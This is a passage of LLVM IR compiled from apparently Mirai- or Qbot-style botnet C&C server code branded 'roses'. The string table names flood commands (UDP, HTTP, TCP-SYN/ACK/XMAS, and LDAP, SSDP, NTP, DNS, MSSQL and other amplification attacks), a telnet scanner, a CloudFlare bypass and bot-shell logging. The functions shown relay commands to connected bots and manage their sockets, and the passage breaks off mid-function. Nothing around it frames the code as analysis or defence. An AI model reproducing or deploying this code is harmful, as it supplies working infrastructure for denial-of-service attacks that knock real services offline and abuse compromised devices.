@.str.176 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;32mIP Geolocation\1B[1;37m]    resolve   [\1B[0;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.177 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;33mSubDomain Scanner\1B[1;37m] root_sub  [\1B[0;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.178 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;34mPort Scanner\1B[1;37m]      root_scan [\1B[0;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.179 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;35mCloudFlare Bypass\1B[1;37m] root_cf   [\1B[0;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.180 = private unnamed_addr constant [9 x i8] c"root_add\00", align 1
@.str.181 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] User Added!\0D\0A\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"root_geo\00", align 1
@.str.183 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Starting geolocation!\0D\0A\00", align 1
@.str.184 = private unnamed_addr constant [9 x i8] c"root_sub\00", align 1
@.str.185 = private unnamed_addr constant [56 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Starting subdomain scan!\0D\0A\00", align 1
@.str.186 = private unnamed_addr constant [10 x i8] c"root_scan\00", align 1
@.str.187 = private unnamed_addr constant [50 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Starting PortScan!\0D\0A\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"root_cf\00", align 1
@.str.189 = private unnamed_addr constant [56 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Starting CF_Bypass scan!\0D\0A\00", align 1
@.str.190 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.191 = private unnamed_addr constant [70 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Logged Out!\0A\00", align 1
@.str.192 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.193 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.194 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.195 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.196 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.197 = private unnamed_addr constant [87 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] User: \1B[0;36m%s\1B[1;37m Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.198 = private unnamed_addr constant [8 x i8] c"!* STOP\00", align 1
@.str.199 = private unnamed_addr constant [24 x i8] c"[roses] Attack Stopped!\00", align 1
@.str.200 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.201 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mUDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.202 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.203 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mSTD \1B[1;37mFlood!\0D\0A\00", align 1
@.str.204 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.205 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mCNC \1B[1;37mFlood!\0D\0A\00", align 1
@.str.206 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.207 = private unnamed_addr constant [65 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mHTTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.208 = private unnamed_addr constant [8 x i8] c"!* JUNK\00", align 1
@.str.209 = private unnamed_addr constant [8 x i8] c"!* HOLD\00", align 1
@.str.210 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.211 = private unnamed_addr constant [50 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Loading sockets...\0D\0A\00", align 1
@.str.212 = private unnamed_addr constant [8 x i8] c"!* WGET\00", align 1
@.str.213 = private unnamed_addr constant [65 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mWGET \1B[1;37mFlood!\0D\0A\00", align 1
@.str.214 = private unnamed_addr constant [5 x i8] c"XMAS\00", align 1
@.str.215 = private unnamed_addr constant [117 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[1;31mT\1B[1;32mC\1B[1;33mP\1B[1;34m-\1B[1;35mX\1B[1;36mM\1B[1;31mA\1B[1;32mS \1B[1;37mFlood\0D\0A\00", align 1
@.str.216 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.217 = private unnamed_addr constant [96 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[1;31mTCP \1B[1;37mFlood using \1B[0;31mALL \1B[1;37mMethods!\0D\0A\00", align 1
@.str.218 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.219 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;36mTCP-SYN \1B[1;37mFlood\0D\0A\00", align 1
@.str.220 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.221 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;36mTCP-FIN \1B[1;37mFlood\0D\0A\00", align 1
@.str.222 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.223 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;36mTCP-RST \1B[1;37mFlood\0D\0A\00", align 1
@.str.224 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.225 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;36mTCP-ACK \1B[1;37mFlood\0D\0A\00", align 1
@.str.226 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.227 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;36mTCP-PSH \1B[1;37mFlood\0D\0A\00", align 1
@.str.228 = private unnamed_addr constant [4 x i8] c"PRO\00", align 1
@.str.229 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;36mTCP-PRO \1B[1;37mFlood\0D\0A\00", align 1
@.str.230 = private unnamed_addr constant [4 x i8] c"CRI\00", align 1
@.str.231 = private unnamed_addr constant [67 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;36mTCP-CRI \1B[1;37mFlood\0D\0A\00", align 1
@.str.232 = private unnamed_addr constant [10 x i8] c"root_ldap\00", align 1
@.str.233 = private unnamed_addr constant [65 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mLDAP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.234 = private unnamed_addr constant [10 x i8] c"root_ssdp\00", align 1
@.str.235 = private unnamed_addr constant [65 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mSSDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.236 = private unnamed_addr constant [9 x i8] c"root_ntp\00", align 1
@.str.237 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mNTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.238 = private unnamed_addr constant [14 x i8] c"root_sentinel\00", align 1
@.str.239 = private unnamed_addr constant [69 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mSENTINEL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.240 = private unnamed_addr constant [9 x i8] c"root_dns\00", align 1
@.str.241 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mDNS \1B[1;37mFlood!\0D\0A\00", align 1
@.str.242 = private unnamed_addr constant [11 x i8] c"root_roses\00", align 1
@.str.243 = private unnamed_addr constant [66 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mroses \1B[1;37mFlood!\0D\0A\00", align 1
@.str.244 = private unnamed_addr constant [11 x i8] c"root_mssql\00", align 1
@.str.245 = private unnamed_addr constant [66 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mMSSQL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.246 = private unnamed_addr constant [13 x i8] c"root_portmap\00", align 1
@.str.247 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mPORTMAP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.248 = private unnamed_addr constant [9 x i8] c"root_ts3\00", align 1
@.str.249 = private unnamed_addr constant [64 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Sending \1B[0;31mTS3 \1B[1;37mFlood!\0D\0A\00", align 1
@.str.250 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
@.str.251 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
@.str.252 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.253 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.254 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.255 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.256 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.257 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.258 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.259 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.260 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] - Command:\1B[1;37m[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.261 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.262 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.263 = private unnamed_addr constant [45 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Screening Error\00", align 1
@.str.264 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Incoming Connection From \00", align 1
@.str.265 = private unnamed_addr constant [83 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Incoming Connection From [\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.266 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.267 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.268 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\0A\00", align 1
@.str.269 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.270 = private unnamed_addr constant [97 x i8] c"\1B[1;37m[\1B[0;31mroses\1B[1;37m] Successfully Screened - Created By [\1B[0;36mFlexingOnLamers\1B[1;37m]\0A\00", align 1
@.str.271 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.272 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.273 = private unnamed_addr constant [7 x i8] c"STRING\00", align 1
@.str.274 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.275 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.276 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.277 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @resolve(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.in_addr**, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %6, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0)) #8
  store i32 1, i32* %3, align 4
  br label %40

13:                                               ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %6, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = bitcast i8** %16 to %struct.in_addr**
  store %struct.in_addr** %17, %struct.in_addr*** %7, align 8
  store i32 0, i32* %8, align 4
  br label %18

18:                                               ; preds = %36, %13
  %19 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %19, i64 %21
  %23 = load %struct.in_addr*, %struct.in_addr** %22, align 8
  %24 = icmp ne %struct.in_addr* %23, null
  br i1 %24, label %25, label %39

25:                                               ; preds = %18
  %26 = load i8*, i8** %5, align 8
  %27 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %28 = load i32, i32* %8, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %27, i64 %29
  %31 = load %struct.in_addr*, %struct.in_addr** %30, align 8
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %31, i32 0, i32 0
  %33 = load i32, i32* %32, align 4
  %34 = call i8* @inet_ntoa(i32 %33) #8
  %35 = call i8* @strcpy(i8* %26, i8* %34) #8
  store i32 0, i32* %3, align 4
  br label %40

36:                                               ; No predecessors!
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  br label %18, !llvm.loop !6

39:                                               ; preds = %18
  store i32 1, i32* %3, align 4
  br label %40

40:                                               ; preds = %39, %25, %12
  %41 = load i32, i32* %3, align 4
  ret i32 %41
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @herror(i8*) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !8

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10, !llvm.loop !9

28:                                               ; preds = %10
  br label %29

29:                                               ; preds = %50, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %48

33:                                               ; preds = %29
  %34 = call i16** @__ctype_b_loc() #10
  %35 = load i16*, i16** %34, align 8
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i16, i16* %35, i64 %42
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = and i32 %45, 8192
  %47 = icmp ne i32 %46, 0
  br label %48

48:                                               ; preds = %33, %29
  %49 = phi i1 [ false, %29 ], [ %47, %33 ]
  br i1 %49, label %50, label %53

50:                                               ; preds = %48
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* %5, align 4
  br label %29, !llvm.loop !10

53:                                               ; preds = %48
  %54 = load i32, i32* %4, align 4
  store i32 %54, i32* %3, align 4
  br label %55

55:                                               ; preds = %71, %53
  %56 = load i32, i32* %3, align 4
  %57 = load i32, i32* %5, align 4
  %58 = icmp sle i32 %56, %57
  br i1 %58, label %59, label %74

59:                                               ; preds = %55
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i8*, i8** %2, align 8
  %66 = load i32, i32* %3, align 4
  %67 = load i32, i32* %4, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  store i8 %64, i8* %70, align 1
  br label %71

71:                                               ; preds = %59
  %72 = load i32, i32* %3, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %3, align 4
  br label %55, !llvm.loop !11

74:                                               ; preds = %55
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %4, align 4
  %78 = sub nsw i32 %76, %77
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %75, i64 %79
  store i8 0, i8* %80, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #3

; Function Attrs: nounwind readnone willreturn
declare i16** @__ctype_b_loc() #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0)) #9
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #9
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #8
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #9
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #8
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #8
  %31 = call %struct.tm* @localtime(i64* %9) #8
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #8
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %78, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %81

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %49, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 7
  %47 = load i8, i8* %46, align 2
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42, %38
  br label %78

50:                                               ; preds = %42
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %70

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 1
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %70

60:                                               ; preds = %53
  %61 = load i32, i32* %12, align 4
  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i64 9, i32 16384)
  %63 = load i32, i32* %12, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #9
  %67 = call i64 @send(i32 %63, i8* %64, i64 %66, i32 16384)
  %68 = load i32, i32* %12, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i64 2, i32 16384)
  br label %70

70:                                               ; preds = %60, %53, %50
  %71 = load i32, i32* %12, align 4
  %72 = load i8*, i8** %4, align 8
  %73 = load i8*, i8** %4, align 8
  %74 = call i64 @strlen(i8* %73) #9
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i64 1, i32 16384)
  br label %78

78:                                               ; preds = %70, %49
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %35, !llvm.loop !12

81:                                               ; preds = %35
  %82 = load i8*, i8** %8, align 8
  call void @free(i8* %82) #8
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #3

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #2

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

; Function Attrs: nounwind
declare i64 @time(i64*) #2

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #2

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #2

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @epollEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %18 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #8
  %19 = bitcast i8* %18 to %struct.epoll_event*
  store %struct.epoll_event* %19, %struct.epoll_event** %4, align 8
  br label %20

20:                                               ; preds = %1, %429
  %21 = load volatile i32, i32* @epollFD, align 4
  %22 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %23 = call i32 @epoll_wait(i32 %21, %struct.epoll_event* %22, i32 1000000, i32 -1)
  store i32 %23, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %24

24:                                               ; preds = %426, %20
  %25 = load i32, i32* %7, align 4
  %26 = load i32, i32* %6, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %429

28:                                               ; preds = %24
  %29 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %29, i64 %31
  %33 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 1
  %35 = and i32 %34, 8
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %55, label %37

37:                                               ; preds = %28
  %38 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %38, i64 %40
  %42 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 1
  %44 = and i32 %43, 16
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %55, label %46

46:                                               ; preds = %37
  %47 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %48 = load i32, i32* %7, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %47, i64 %49
  %51 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i32 0, i32 0
  %52 = load i32, i32* %51, align 1
  %53 = and i32 %52, 1
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %134, label %55

55:                                               ; preds = %46, %37, %28
  %56 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %56, i64 %58
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i32 0, i32 1
  %61 = bitcast %union.epoll_data* %60 to i32*
  %62 = load i32, i32* %61, align 1
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %63
